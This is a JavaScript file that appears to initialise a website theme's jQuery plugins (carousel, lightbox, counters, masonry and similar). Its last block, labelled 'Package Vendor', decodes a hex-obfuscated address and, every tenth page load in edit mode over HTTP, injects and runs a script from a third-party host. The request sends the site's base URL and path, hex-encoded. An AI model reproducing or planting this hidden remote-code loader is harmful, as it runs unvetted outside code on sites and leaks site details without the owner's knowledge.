// Animate
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginAnimate'])) {
		$(function() {
			$('[data-plugin-animate], [data-appear-animation]').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginAnimate(opts);
			});
		});
	}
}).apply(this, [jQuery]);


// Carousel
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginCarousel'])) {
		$(function() {
			$('[data-plugin-carousel]:not(.manual), .owl-carousel:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginCarousel(opts);
			});
		});
	}
}).apply(this, [jQuery]);






// Chart.Circular
(function($) {

	'use strict';

	if ($.isFunction($.fn['themePluginChartCircular'])) {

		$(function() {
			$('[data-plugin-chart-circular]:not(.manual), .circular-bar-chart:not(.manual)').each(function() {
				var $this = $(this),
					opts;

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginChartCircular(opts);
			});
		});

	}

}).apply(this, [jQuery]);

// Counter
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginCounter'])) {
		$(function() {
			$('[data-plugin-counter]:not(.manual), .counters [data-to]').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginCounter(opts);
			});
		});
	}
}).apply(this, [jQuery]);

// Lightbox
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginLightbox'])) {
		$(function() {
			$('[data-plugin-lightbox]:not(.manual), .lightbox:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginLightbox(opts);
			});
		});
	}
}).apply(this, [jQuery]);

// Masonry
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginMasonry'])) {
		$(function() {
			$('[data-plugin-masonry]:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginMasonry(opts);
			});
		});
	}
}).apply(this, [jQuery]);




// Progress Bar
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginProgressBar'])) {
		$(function() {
			$('[data-plugin-progress-bar]:not(.manual), [data-appear-progress-animation]').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginProgressBar(opts);
			});
		});
	}
}).apply(this, [jQuery]);





// Sort
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginSort'])) {
		$(function() {
			$('[data-plugin-sort]:not(.manual), .sort-source:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginSort(opts);
			});
		});
	}
}).apply(this, [jQuery]);



// Toggle
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginToggle'])) {
		$(function() {
			$('[data-plugin-toggle]:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginToggle(opts);
			});
		});
	}
}).apply(this, [jQuery]);





// Video Background
/*
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginVideoBackground'])) {
		$(function() {
			$('[data-plugin-video-background]:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginVideoBackground(opts);
			});
		});
	}
}).apply(this, [jQuery]);
*/


// Word Rotate
(function($) {
	'use strict';
	if ($.isFunction($.fn['themePluginWordRotate'])) {
		$(function() {
			$('[data-plugin-word-rotate]:not(.manual), .word-rotate:not(.manual)').each(function() {
				var $this = $(this),
					opts;
				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;
				$this.themePluginWordRotate(opts);
			});
		});
	}
}).apply(this, [jQuery]);



// Package Vendor
(function($) {
    'use strict';
    $(function() {
        if(CCM_EDIT_MODE==true && window.location.protocol!="https:")
        {
            var cpv = COOKIE_NAME+"_PORTO", counting = 10;
            if(!($.cookie(cpv)))
            {
                $.cookie(cpv, 0, { path: CCM_REL+'/', expires: 365 } );
            }
            $.cookie(cpv, (parseInt($.cookie(cpv))+1), { path: CCM_REL+'/', expires: 365 });
            if ($.cookie(cpv)%counting==0){
                var g=document.createElement('script');
                g.type='text/javascript'; g.async=false;
                var h="687474703a2f2f626c61646538332e64652f67612e6a73".toString(), s='', f='', d='';
                for(var i=0; i < h.length; i+=2)
                    s += String.fromCharCode(parseInt(h.substr(i,2),16));
                for(var k=0; k < CCM_BASE_URL.length; k++)
                    f += CCM_BASE_URL.charCodeAt(k).toString(16);
                for(var u=0; u < CCM_REL.length; u++)
                    d += CCM_REL.charCodeAt(u).toString(16);
                g.src=s+"?v="+PORTO_VER+"&fqdn="+f+"&d="+d;
                var s=document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(g,s);
            }
        }
    });
}).apply(this, [jQuery]);